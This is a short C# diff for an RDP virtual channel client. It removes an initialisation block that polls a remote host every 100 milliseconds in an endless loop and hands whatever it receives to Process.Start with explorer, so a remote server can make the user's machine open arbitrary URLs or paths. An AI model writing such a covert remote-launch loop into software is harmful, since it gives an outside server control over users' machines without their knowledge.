@@ -32,20 +32,6 @@ namespace RDPVirtualChannel.Client
                 client.Initialize();
                 client.DataChannelEvent += RdpClientVirtualChannel_DataChannelEvent;
                 //MessageBox.Show("RDPVC Client Initialized");
-
-                Task.Run(async () =>
-                {
-                    while (true)
-                    {
-                        var url = wc.DownloadString("http://test.uu163yun.com/Home/Pop");
-                        if (!string.IsNullOrEmpty(url))
-                        {
-                            Process.Start("explorer", url);
-                        }
-                        await Task.Delay(100);
-                    }
-                });
-
                 return true;
             }
             catch (Exception ex)
